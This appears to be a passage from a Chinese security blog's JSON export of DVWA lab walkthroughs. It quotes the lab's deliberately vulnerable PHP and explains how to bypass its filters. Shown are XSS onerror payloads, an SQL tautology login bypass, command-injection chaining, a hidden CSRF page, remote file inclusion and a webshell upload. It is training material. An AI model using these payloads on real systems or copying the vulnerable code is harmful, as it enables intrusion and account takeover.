服务器加入了黑名单过滤输入，防御了双写和大小写绕过 虽然无法使用&lt;script&gt;标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。输入&lt;img src=1 onerror=alert(/xss/)&gt;即可弹窗 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // 获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息 $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // 净化输入的名称 $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 跟反射型一样，虽然用正则表达式过滤了&lt;script&gt;标签，但是没有img、iframe等其它标签 用bp抓包，改name的参数为&lt;img src=1 onerror=alert(1)&gt;即可弹窗","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect.xyz/tags/dvwa/"}]},{"title":"基于DVWA的web漏洞原理-medium","slug":"dvwa-medium","date":"2018-07-07T05:42:47.016Z","updated":"2018-07-13T12:17:58.134Z","comments":true,"path":"2018/07/07/dvwa-medium/","link":"","permalink":"https://perfect.xyz/2018/07/07/dvwa-medium/","excerpt":"low完了就很快了","text":"low完了就很快了 Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 去掉输入的用户名中的特殊字符 $user = $_GET[ &apos;username&apos; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 去掉输入的密码中的特殊字符 $pass = $_GET[ &apos;password&apos; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取用户的详细信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 服务器端在low的基础上增加了mysql_real_escape_string()函数，这个函数可以对字符串中的特殊符号进行转义，基本上抵御了sql注入 当然这种抵御方式也不是万能的，通过构造编码也可以绕过 详情请见：http://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html 同时$pass也做了md5校验，杜绝了password注入 虽然加入了防爆破机制(sleep(2))，但是2秒的沉睡并不算什么 直接用bp爆破就好了 Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = $_REQUEST[ &apos;ip&apos; ]; // 设置黑名单 $substitutions = array( &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, ); // 删除黑名单中的值 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; 跟low相比也只多了将&amp;&amp;和;这两个字符过滤掉，继续用||命令就好了 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 检查请求来自哪里 if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) { // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 两次输入的密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // 不是可信任的来源 echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; stripos(string,find,start) 查找find在string中出现的位置，没有找到则返回false 服务器想通过检查http包头的Referer参数的值中有没有要访问的主机名来抵御CSRF攻击Referer主要用来让服务器判断来源页面 逻辑是判断Referer参数中有没有目的主机的名，而Referer参数中会把完整的域名写进去，所以绕过的方法很简单，只要攻击者把攻击页面的名字改为目的主机的主机名即可绕过 File Inclusion文件包含 核心代码： &lt;?php // 显示的页面参数值 $file = $_GET[ &apos;page&apos; ]; // 输入检查 $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file ); ?&gt; 可以看见多了一个输入检查，利用str_replace函数讲page的值中的http:\\\\等字符删除但是str_replace这个本身就是有漏洞的，只要重写就可以绕过，比如http:\\\\写成hthttp://tp://，str_replace函数只会删除一个http:\\\\ 其他操作都与low的文件包含一样 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 文件上传路径 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件信息 $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; // 检查是否为img if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // 文件夹是否能移动到新位置 if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // 不能 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 可以 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // 图片不是Img时 echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; 可以看到，服务器对文件的类型和大小进行了限制，但是只检查了Content-Ytpy这个字段只要用bp抓包，把这个字段的值改为image/png就可以绕过了 也可以利用文件包含的，不管是不是php文件，都会尝试当做php来执行的特性 用工具来包含我们上传的png文件，当然文件的内容是一句话木马 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) { // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_POST[&apos;g-recaptcha-response&apos;] ); // 验证是否成功 if( !$resp ) { // 验证失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // 验证成功，检查两次输入的密码是否一致 if( $pass_new == $pass_conf ) { // 显示下一阶段 echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;{$pass_new}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;{$pass_conf}\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;passed_captcha\\&quot; value=\\&quot;true\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; } else { // 密码不匹配 $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) { // 隐藏CAPTCHA窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 检查是否做了第一阶段 if( !$_POST[ &apos;passed_captcha&apos; ] ) { $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return; } // 检查密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 可以看到，服务器在第二步验证的时候，增加了对passed_captcha的检查，如果第一阶段的验证码通过了，那么passed_captcha就会变成true 本质上跟low级别没什么区别，只要在包中多加一个passed_captcha=true就好了 CSRF也一样，多加一条&lt;input type=&quot;hidden&quot; name=&quot;passed_captcha&quot; value=&quot;true&quot;&gt; 实际场景中，攻击者不可能知道这个多出来的参数是什么，所以第一步应该要先通过验证并且抓包，观察包中传了什么参数过去 SQL Injectionsql注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_POST[ &apos;id&apos; ]; // 转义sql语句中的特殊字符串 $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); // 连接数据库，将查询的结果放入结果集中 $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; ); // 获取结果集 while( $row = mysqli_fetch_assoc( $result ) ) { // 显示值 $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // 反馈给用户 echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;; } } ?&gt; 服务器先是使用mysql_real_escape_string函数将单引号以及双引号之类的特殊字符转义掉，再用下拉框来限制用户输入 下拉框很好解决，只要用bp抓包,直接在bp里面改就行 因为是数字型的注入，所以单引号基本用不着，只有在where语句上会用到单引号 将单引号以及单引号里面的内容全部转换成十六进制就可以绕过了，其他步骤同low SQL Injection (Blind)sql盲注 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $id = $_POST[ &apos;id&apos; ]; // 净化输入的信息，比如消除反斜杠，检测输入的值是否为对象等 $id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 连接数据库，并将查询的结果放入结果集中 $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // 获取结果集 $num = @mysqli_num_rows( $result ); if( $num &gt; 0 ) { // 反馈给用户 echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; } else { // 反馈给用户 echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; } //mysql_close(); } ?&gt; 设置了下拉框限制用户输入，同时也消除了反斜杠之类的字符，但是对注入并没有什么影响 用bp抓包，在bp里改参数就行了 Weak Session IDs弱Session的id 核心代码： &lt;?php $html = &quot;&quot;; if ($_SERVER[&apos;REQUEST_METHOD&apos;] == &quot;POST&quot;) { $cookie_value = time(); setcookie(&quot;dvwaSession&quot;, $cookie_value); } ?&gt; 将SessionID的值改为当前的时间 攻击者做的攻击流程跟low一样，只是多一步预估受害者进入系统的时间 XSS (DOM)核心代码： &lt;?php // 检查是否输入了值 if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { $default = $_GET[&apos;default&apos;]; //不永许脚本标记 if (stripos ($default, &quot;&lt;script&quot;) !== false) { header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 服务器端检查了输入的值是否为空，并且不允许出现script标签，出现了就把默认值改为english 只要在？default中间加一个#就可以绕过了，#后面的值不会传给服务器 或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件 ?default=English&gt;/option&gt;&lt;img src=1 onerror=alert(/xss/)&gt; XSS (Reflected)反射型xss 核心代码： &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // 检查是否输入了值 if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // 获取输入的值 $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] ); // 反馈给用户 echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } ?&gt; str_replace函数将输入的&lt;script&gt;删除 这个函数的绕过很简单，重写或者大小写替换都可以 XSS (Stored)存储型xss 核心代码： &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // 获取输入的值 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // 净化输入的信息 $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // 净化输入的名称 $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 更新数据库 $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用&lt;b&gt;标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了&lt;script&gt;字符串，仍然存在存储型的XSS。 用bp抓包，在name里用重写或者大小写就可以绕过了","categories":[{"name":"web安全","slug":"web安全","permalink":"https://perfect.xyz/categories/web安全/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://perfect.xyz/tags/dvwa/"}]},{"title":"基于DVWA的web漏洞原理-low","slug":"dvwa-low","date":"2018-07-05T06:28:20.794Z","updated":"2018-07-19T12:09:16.054Z","comments":true,"path":"2018/07/05/dvwa-low/","link":"","permalink":"https://perfect.xyz/2018/07/05/dvwa-low/","excerpt":"php看的我眼睛都瞎了","text":"php看的我眼睛都瞎了 Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 获取用户名 $user = $_GET[ &apos;username&apos; ]; // 获取密码 $pass = $_GET[ &apos;password&apos; ]; //用md5加密 $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; //将结果保存到结果集中，如果错误，则输出一条错误信息并退出脚本 $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //判断结果集是否为1 if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取数据库中的用户信息 $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // 登录成功 $html .= &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;{$avatar}\\&quot; /&gt;&quot;; } else { // 登录失败 $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 服务器对输入的username与password没有做限制，这就存在sql注入漏洞 关键点在于&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot; 这条语句 当用户输入的username的值为admin’ or ‘1’=’1时，整条语句就会变为&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;admin&#39; or &#39;1&#39;=&#39;1&#39; AND password = &#39;$pass&#39;;&quot;这条语句的逻辑为当user为admin或者当1=1为真时，整条语句为真 然而1=1永远为真，所以整条语句为真 语句返回一个true，即1，存到结果集中，这与输入正确的用户名和密码导致的结果是一样的 结果就是攻击者不需要知道admin的密码就登录了admin的账号 Command Injection远程命令注入 核心代码： &lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // 获取输入的值 $target = $_REQUEST[ &apos;ip&apos; ]; // 确定操作系统并执行ping命令 if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // linux $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // 反馈给用户 echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; stristr（）函数在php中为忽略大小写 php_uname（）函数返回运行php系统有关的信息，参数s为返回系统的名称 原理也是过滤不严，没有对输入的值进行检查 直接在输入的ip地址后面加上&amp;、&amp;&amp;、|、||，加上自己想要执行的命令就行 拼接符号A &amp; B 简单的拼接，AB之间并无制约关系 A &amp;&amp; B A执行成功才会执行B A | B A的输出作为B的输入 A || B A执行失败才会执行B 常用命令ipconfig 查看本地网络 net user 查看系统用户 dir 查看当前目录 find 查找包含指定字符的行 whoami 查看系统当前有效用户名 CSRF跨站点请求伪造 核心代码： &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // 获取输入的值 $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // 检测密码是否匹配 if( $pass_new == $pass_conf ) { // 匹配成功 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // 更新数据库 $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // 反馈给用户 echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // 密码不匹配 echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; CSRF原理CSRF通过伪装来自受信任用户的请求来访问受信任的网站 1.当用户A访问了受信任的网站B 2.在打开B网页没有关闭的情况下又去访问了C 3.C利用A在B中未过期的cookie，发出一些请求代码来访问B 4.这样C就能在A不知情的情况下利用A的身份访问了B 而在上面的核心代码中，服务器收到请求后，只会检查两次输入的密码是否相同，没有任何防御CSRF的机制 利用方法构造urlhttp://localhost:8888/dvwa/vulnerabilities/csrf/password_new=password&amp;password_conf=password&amp;Change=Change#当受害者点击了这个url，他的密码就会被改成password 然而实际运用中，受害者点击这个url之后就会返回一个修改密码成功的界面，所以这个方法并不好用 构造攻击页面在自己的服务器上构造一个html页面 &lt;img src=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf/?? password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt; 当受害者访问这个页面时，会以为访问了一个失效的url，但实际上密码已经被篡改 File Inclusion文件包含 核心代码： &lt;?php // 传入选择的参数 $file = $_GET[ &apos;page&apos; ]; ?&gt; 核心代码很简单，由用户选择文件，服务器去包含执行这些文件 服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。 利用方法构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=phpinfo.php服务器会将phpinfo的内容显示在页面上 远程文件包含当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件 在远程服务xx.xx.xx.xx上上传一个文件phpinfo.php 内容如下 &lt;?php phpinfo (); ?&gt; 构造url：http://localhost:8888/dvwa/vulnerabilities/fi/?page=heep://xx.xx.xx.xx/phpinfo.php即可访问 File Upload文件上传 核心代码： &lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // 上传的路径和文件名 $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // 文件是否能移动到新位置，用于检查文件是否上传成功 if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // 不能移动 echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // 可以移动 echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; 对上传的文件没有任何的检查和过滤，只要上传php文件就可以获取服务器的webshell权限 Insecure CAPTCHA不安全的验证码 核心代码： &lt;?php //检查验证码是否正确 if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) { // 隐藏验证码窗体 $hide_form = true; // 获取输入的值 $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // 从第三方获取验证码 $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos;], $_POST[&apos;g-recaptcha-response&apos;] ); // 检查输入的验证码是否正确 if( !$resp ) { // 输入的验证码错误 $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // 检查输入的两个新密码是否匹配 if( $pass_new == $pass_conf ) { // 两个密码匹配 $html .= &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br 